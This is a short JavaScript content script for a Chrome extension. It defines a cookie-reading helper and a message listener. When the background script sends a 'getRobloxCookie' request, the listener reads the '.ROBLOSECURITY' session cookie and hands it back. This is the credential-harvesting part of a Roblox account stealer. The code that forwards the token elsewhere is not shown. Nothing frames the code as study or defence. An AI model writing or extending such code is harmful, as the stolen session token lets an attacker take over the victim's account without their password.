// Function to get a specific cookie by name
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

// Listen for messages from the background script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'getRobloxCookie') {
        const robloxSecurityCookie = getCookie('.ROBLOSECURITY');
        sendResponse({ cookie: robloxSecurityCookie });
    }
});
